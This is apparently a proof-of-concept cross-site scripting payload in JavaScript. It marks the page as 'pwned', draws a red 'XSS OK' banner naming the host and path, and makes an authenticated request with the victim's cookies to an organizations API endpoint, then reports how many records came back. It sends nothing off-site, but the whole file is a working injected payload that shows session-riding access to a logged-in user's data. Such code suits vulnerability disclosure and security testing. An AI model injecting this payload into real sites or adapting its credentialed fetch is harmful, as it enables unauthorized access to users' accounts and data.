(function () {
  document.documentElement.setAttribute('data-pwned', '1');
  var d = document.createElement('div');
  d.id = 'poc-xss';
  d.style.cssText = 'position:fixed;z-index:2147483647;top:0;left:0;right:0;padding:8px;background:#b00;color:#fff;font:14px monospace';
  d.textContent = 'XSS OK @ ' + location.host + location.pathname;
  document.body.appendChild(d);
  fetch('/api/v1/organizations/', { credentials: 'include' })
    .then(function (r) { return r.ok ? r.json() : null; })
    .then(function (j) {
      var n = (j && j.results) ? j.results.length : 'n/a';
      d.textContent += ' | orgs=' + n;
      console.log('[POC] XSS on ' + location.host + ' orgs=' + n);
    });
})();
